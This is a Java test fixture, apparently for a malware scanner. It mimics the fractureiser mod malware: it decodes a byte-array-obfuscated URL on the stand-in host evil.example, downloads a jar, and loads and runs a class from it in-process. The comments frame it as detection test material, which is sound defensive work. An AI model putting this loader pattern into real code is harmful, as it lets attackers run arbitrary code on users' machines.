// Fixture: the fractureiser Stage-1/2 shape — fetch a payload from a
// hidden URL, stage it on disk, load it as code. Same first two links
// as Dropper, but the payload is loaded in-process instead of handed to
// the OS, which is how a mod stays a mod. Never executed: the target
// class does not exist, it is only a Class.forName target string, so
// D03 sees the call and nothing runs at scan time.
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class Reloader {
    public void stageAndLoad() throws Exception {
        byte[] bs = new byte[]{
            104, 116, 116, 112, 58, 47, 47, 101, 118, 105, 108, 46,
            101, 120, 97, 109, 112, 108, 101, 47, 114, 101, 108, 111,
            97, 100, 46, 106, 97, 114
        };
        String url = new String(bs);
        File payload = File.createTempFile("payload", ".jar");
        try (InputStream in = new URL(url).openStream();
             FileOutputStream out = new FileOutputStream(payload)) {
            out.write(in.readAllBytes());
        }
        URLClassLoader loader = new URLClassLoader(new URL[]{payload.toURI().toURL()});
        Class<?> stage2 = Class.forName("com.evil.Stage2", true, loader);
        stage2.getMethod("run").invoke(null);
    }
}
